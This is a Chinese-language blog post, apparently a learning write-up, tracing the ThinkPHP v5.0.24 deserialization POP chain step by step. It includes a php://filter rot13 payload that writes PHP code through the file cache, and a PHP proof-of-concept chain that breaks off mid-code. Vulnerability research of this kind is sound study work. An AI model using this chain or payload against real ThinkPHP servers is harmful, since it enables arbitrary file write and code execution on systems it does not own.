@@ -1,0 +1,1593 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="JiangNiao">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="JiangNiao">
+    
+    <meta name="keywords" content="hexo,网络安全,hexo-blog">
+    
+    <meta name="description" content="一起努力">
+    <meta name="description" content="菜鸟第一次TP反序列化复现，dalao不要喷我了，不过我也没有开启评论功能。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP v5.0.24 反序列化链学习">
+<meta property="og:url" content="https://github.com/Jiang-Niao/Jiang-Niao.github.io/2021/02/08/TP%20v5.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html">
+<meta property="og:site_name" content="江鸟&#39;s Bolg">
+<meta property="og:description" content="菜鸟第一次TP反序列化复现，dalao不要喷我了，不过我也没有开启评论功能。">
+<meta property="og:image" content="http://img.jiangniao.top/20210208203212.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210208203323.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210208203553.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210208203611.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215124942.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215125929.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215130141.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215131715.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215131910.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215132058.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215132222.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215132517.png">
+<meta property="og:image" content="http://img.jiangniao.top/20210215132623.png">
+<meta property="article:published_time" content="2021-02-08T08:08:54.619Z">
+<meta property="article:modified_time" content="2021-02-18T03:23:15.262Z">
+<meta property="article:author" content="JiangNiao">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.jiangniao.top/20210208203212.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>TP v5.0.24 反序列化链学习 · 江鸟&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/jn.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >江鸟&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">TP v5.0.24 反序列化链学习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>江鸟's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(http://img.jiangniao.top/20201115162121.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            TP v5.0.24 反序列化链学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/02/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>菜鸟第一次TP反序列化复现，dalao不要喷我了，不过我也没有开启评论功能。</p>
+<a id="more"></a>
+
+<h1 id="TP-v5-0-24-反序列化链"><a href="#TP-v5-0-24-反序列化链" class="headerlink" title="TP v5.0.24 反序列化链"></a>TP v5.0.24 反序列化链</h1><p>学习一下tp系列的反序列化挖掘过程</p>
+<p>环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">topthink v5.0.24</span><br><span class="line">PHP Version 5.6.40</span><br><span class="line">Apache</span><br></pre></td></tr></table></figure>
+
+<h2 id="前要知识点"><a href="#前要知识点" class="headerlink" title="前要知识点"></a>前要知识点</h2><p>__destruct: PHP5引入了析构方法的概念，这类似于其它面向对象的语言，如C++，析构方法会在当某个对象的所有引用都被删除或者当对象被显式销毁时执行。实际上，当PHP脚本运行结束之前，所有的变量都会被销毁，因此析构方法在类被反序列化并实例化后必然会被调用。</p>
+<p>__toString:当一个对象被当作字符串对待的时候，会触发这个魔术方法。而当file_exists处理时，$filename被当做了字符串，因此如果$filename为类对象的话，此处可以触发该类的__toString方法。</p>
+<h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><p>开始</p>
+<p><strong>反序列化起点：thinkphp/library/think/process/pipes/Windows.php</strong> <code>removeFiles</code>方法</p>
+<p><img src="http://img.jiangniao.top/20210208203212.png" alt="image-20210208203212691"></p>
+<p><code>file_exists</code>方法能够触发<code>__toString</code>魔术方法</p>
+<p><img src="http://img.jiangniao.top/20210208203323.png" alt="image-20210208203323673"></p>
+<p>我们需要利用__toString做跳板，找到了Model抽象类</p>
+<p>因为Model是抽象类 不能直接定义所以我们需要找到他的子类</p>
+<p>找到了Pivot子类，后面写poc会用到</p>
+<p><strong>跳板利用点：thinkphp/library/think/Model.php</strong></p>
+<p><strong>Model抽象类</strong>的 <code>__toString</code></p>
+<p><img src="http://img.jiangniao.top/20210208203553.png" alt="image-20210208203553708"></p>
+<p>__toString方法，这里调用了toJson方法。</p>
+<p><img src="http://img.jiangniao.top/20210208203611.png" alt="image-20210208203611675"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">接着调用了toArray方法，主要是将该对象转成JSON字符串，跟进到toArray方法。此时$this-&gt;append为类属性可控，则$key、$name可控，我们需要寻找到类似$可控对象-&gt;方法($可控参数)的调用链</span><br><span class="line"></span><br><span class="line">找到这个</span><br><span class="line"> $item[$key] &#x3D; $value ? $value-&gt;getAttr($attr) : null;</span><br></pre></td></tr></table></figure>
+
+<p>分析下如何达到该行代码</p>
+<p>需要的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$relation &#x3D; Loader::parseName($name, 1, false);&#x2F;&#x2F;字符串命名风格转换 可控</span><br><span class="line">$modelRelation &#x3D; $this-&gt;$relation();</span><br><span class="line">&#x2F;&#x2F;这行代码用通俗的话来讲就是 把$modelRelation 赋值为 \think\Model 类任意方法的返回结果</span><br><span class="line"></span><br><span class="line">来看这个代码</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 返回模型的错误信息</span><br><span class="line">     * @access public</span><br><span class="line">     * @return string|array</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getError()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    如果$relation &#x3D; getError 的话 那么我们就做到了真正可控</span><br><span class="line"></span><br><span class="line">$value &#x3D; $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://img.jiangniao.top/20210215124942.png" alt="image-20210215124942546"></p>
+<p>来看这一行<code>$value = $this-&gt;getRelationData($modelRelation);</code></p>
+<p>跟进</p>
+<p><img src="http://img.jiangniao.top/20210215125929.png" alt="image-20210215125929876"></p>
+<p>如果我们进入第一个 if ，函数就直接返回 $this-&gt;parent</p>
+<p>跟进isSelfRelation()，发现返回值可控，条件可以满足</p>
+<p><img src="http://img.jiangniao.top/20210215130141.png" alt="image-20210215130141756"></p>
+<p>下一个条件是<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code></p>
+<p>跟进getModel()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;Relation.php</span><br><span class="line"></span><br><span class="line">public function getModel()</span><br><span class="line"> &#123;</span><br><span class="line">     return $this-&gt;query-&gt;getModel();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>下一个getModel() 可控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Query.php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">   * 获取当前的模型对象实例</span><br><span class="line">   * @access public</span><br><span class="line">   * @return Model|null</span><br><span class="line">   *&#x2F;</span><br><span class="line">  public function getModel()</span><br><span class="line">  &#123;</span><br><span class="line">      return $this-&gt;model;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>\think\Model \think\Model 类中： query =new think\db\Query() ,<br>然后 \think\db\Query 类中： model = \think\Model 类中的 parent 就行了，这样就可以满足if 的判断条件了</p>
+<p>回到toArray()中</p>
+<p>来看if判断吧</p>
+<p>第一个：<code>if (method_exists($modelRelation, &#39;getBindAttr&#39;))</code></p>
+<p>需要$modelRelations 中 含有 getBindAttr() 方法，我们在 Relation 类中搜索 getBindAttr() 方法没有找到，所以需要去子类找，寻找继承了Relation类并且存在getBindAttr() 方法的类。</p>
+<p>只有这一个</p>
+<p>thinkphp/library/think/model/relation/OneToOne.php 可控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getBindAttr()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;bindAttr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>OneToOne是一个抽象类 我们找到继承了OneToOne 的类 HasOne类</p>
+<p>至此代码执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行<strong>Output类</strong><code>__call</code>魔术方法</p>
+<p>跟进Output类<code>block</code>方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected function block($style, $message)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;writeln(&quot;&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;&#x2F;$style&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进<code>writelin</code>方法,最后会调用<code>write</code>方法</p>
+<p>这里<code>$this-&gt;handle</code>可控,全局搜索<code>write</code>方法，进一步利用</p>
+<p><img src="http://img.jiangniao.top/20210215131715.png" alt="image-20210215131715482"></p>
+<p><strong>定位到：thinkphp/library/think/session/driver/Memcached.php</strong></p>
+<p><strong>类： Memcached</strong></p>
+<p><img src="http://img.jiangniao.top/20210215131910.png" alt="image-20210215131909992"></p>
+<p>继续搜索可用<code>set</code>方法</p>
+<p><strong>定位到：thinkphp/library/think/cache/driver/File.php</strong></p>
+<p><strong>类：File</strong></p>
+<p><img src="http://img.jiangniao.top/20210215132058.png" alt="image-20210215132058506"></p>
+<p>跟进getCacheKey 发现<code>$filename</code>可控</p>
+<p><img src="http://img.jiangniao.top/20210215132222.png" alt="image-20210215132222195"></p>
+<p><code>$data</code>值比较棘手,这里有个坑，由于最后调用<code>set</code>方法中的参数来自先前调用的<code>write</code>方法只能为<code>true</code></p>
+<p>继续执行,跟进下方的<code>setTagItem</code>方法</p>
+<p><img src="http://img.jiangniao.top/20210215132517.png" alt="image-20210215132517299"></p>
+<p>会再执行一次<code>set</code>方法，且这里文件内容<code>$value</code>通过<code>$name</code>赋值(文件名)</p>
+<p>所以可以在文件名上做手脚</p>
+<p>注意 $data中有exit(); 所以我们需要绕过<img src="http://img.jiangniao.top/20210215132623.png" alt="image-20210215132623083">    </p>
+<p>可以使用伪协议 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;.&#x2F;&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows &#123;</span><br><span class="line">        private $files &#x3D; [];</span><br><span class="line"></span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files &#x3D; [$files]; &#x2F;&#x2F;$file &#x3D;&gt; &#x2F;think&#x2F;Model的子类new Pivot(); Model是抽象类</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append &#x3D; [];</span><br><span class="line">        protected $error &#x3D; null;</span><br><span class="line">        public $parent;</span><br><span class="line"></span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent &#x3D; $output;  &#x2F;&#x2F;$this-&gt;parent&#x3D;&gt; think\console\Output;</span><br><span class="line">            $this-&gt;append &#x3D; array(&quot;xxx&quot;&#x3D;&gt;&quot;getError&quot;);     &#x2F;&#x2F;调用getError 返回this-&gt;error</span><br><span class="line">            $this-&gt;error &#x3D; $modelRelation;               &#x2F;&#x2F; $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类&#x3D;&#x3D;&gt;&gt;HasOne</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;</span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne extends OneToOne &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation &#123;</span><br><span class="line">    abstract class OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr &#x3D; [];</span><br><span class="line">        protected $query;</span><br><span class="line">        function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation &#x3D; 0;</span><br><span class="line">            $this-&gt;query &#x3D; $query;    &#x2F;&#x2F;$query指向Query</span><br><span class="line">            $this-&gt;bindAttr &#x3D; [&#39;xxx&#39;];&#x2F;&#x2F; $value值，作为call函数引用的第二变量</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db &#123;</span><br><span class="line">    class Query &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        function __construct($model)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model &#x3D; $model; &#x2F;&#x2F;$this-&gt;model&#x3D;&gt; think\console\Output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        private $handle;</span><br><span class="line">        protected $styles;</span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles &#x3D; [&#39;getAttr&#39;];</span><br><span class="line">            $this-&gt;handle &#x3D;$handle; &#x2F;&#x2F;$handle-&gt;think\session\driver\Memcached</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver &#123;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line"></span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler &#x3D; $handle; &#x2F;&#x2F;$handle-&gt;think\cache\driver\File</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options&#x3D;null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options&#x3D;[</span><br><span class="line">                &#39;expire&#39; &#x3D;&gt; 3600,</span><br><span class="line">                &#39;cache_subdir&#39; 